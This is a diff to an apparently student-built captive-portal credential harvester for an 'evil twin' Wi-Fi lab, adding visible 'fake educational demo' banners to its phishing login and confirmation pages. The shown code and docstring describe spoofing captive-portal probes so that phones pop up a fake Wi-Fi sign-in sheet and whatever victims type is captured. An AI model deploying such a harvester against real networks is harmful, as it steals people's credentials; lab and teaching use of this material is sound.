@@ -1,6 +1,10 @@
 #!/usr/bin/env python3
 """Captive-portal credential harvester for the AL-GHUL evil twin.
 
+LAB / EDUCATIONAL USE ONLY (CSDA final project, RU). Every page carries an always-visible
+"FAKE - EDUCATIONAL LAB DEMO" badge. This is the generic portal; portal_social.py is the
+fuller version used in the write-up (social logins + the captive-portal unlock flag).
+
 Runs on the gateway laptop. The twin's DNS (dns_spy) points the operating
 system's captive-portal probe domains at this server, so the victim's phone
 pops the familiar "Sign in to Wi-Fi" sheet on its own. Whatever they type is
@@ -41,8 +45,10 @@ LOGIN_PAGE = """<!doctype html><html><head><meta charset=utf-8>
  input{width:100%;box-sizing:border-box;padding:11px;border:1px solid #d1d1d6;border-radius:9px;font-size:16px}
  button{width:100%;margin-top:20px;padding:12px;border:0;border-radius:9px;background:#007aff;
    color:#fff;font-size:16px;font-weight:600}
- .foot{color:#aeaeb2;font-size:11px;text-align:center;margin-top:16px}</style></head>
-<body><form class=card method=post action="/login">
+ .foot{color:#aeaeb2;font-size:11px;text-align:center;margin-top:16px}
+ .edu{position:fixed;top:0;left:0;right:0;background:#9a1420;color:#fff;font-size:12px;
+   text-align:center;padding:7px 10px;z-index:9}</style></head>
+<body><div class=edu>&#9888; FAKE &mdash; EDUCATIONAL LAB DEMO (CSDA / RU) &mdash; NOT a real login, do not enter real credentials</div><form class=card method=post action="/login">
  <h1>Sign in to Wi-Fi</h1><p class=sub>Kaffi_FRI &middot; Guest access</p>
  <label>Email</label><input name=username type=email autocomplete=username required>
  <label>Password</label><input name=password type=password autocomplete=current-password required>
@@ -52,6 +58,7 @@ LOGIN_PAGE = """<!doctype html><html><head><meta charset=utf-8>
 
 DONE_PAGE = """<!doctype html><meta charset=utf-8><title>Connected</title>
 <body style="font-family:sans-serif;text-align:center;padding-top:60px">
+<div style="position:fixed;top:0;left:0;right:0;background:#9a1420;color:#fff;font-size:12px;padding:7px">&#9888; FAKE &mdash; EDUCATIONAL LAB DEMO (CSDA / RU)</div>
 <h2>You are connected.</h2><p>You can return to your browser.</p></body>"""
 
 PROBE_PATHS = {"/generate_204", "/gen_204", "/hotspot-detect.html",
